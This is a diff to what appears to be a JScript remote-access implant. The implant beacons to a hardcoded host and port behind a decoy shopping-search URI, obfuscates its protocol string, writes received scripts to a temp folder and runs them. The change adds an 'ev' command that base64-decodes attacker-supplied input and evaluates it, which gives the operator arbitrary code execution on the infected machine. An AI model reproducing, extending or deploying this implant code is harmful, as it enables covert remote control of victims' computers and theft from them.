@@ -1,6 +1,6 @@
 //Define variables
 var ho = "192.168."
-var me = "8.17"
+var me = "0.26"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -162,6 +162,10 @@ while(true)
         fd.close()
         runner.Run(temp+"\\"+id+".js")
         retval = "[+] Spawn success..."
+      }
+
+      else if((jsObject.cmnd.split(" ")[0] == "ev")) {
+        retval = eval(b64d(jsObject.cmnd.split(" ")[1]))
       }
 
       //psh and cs
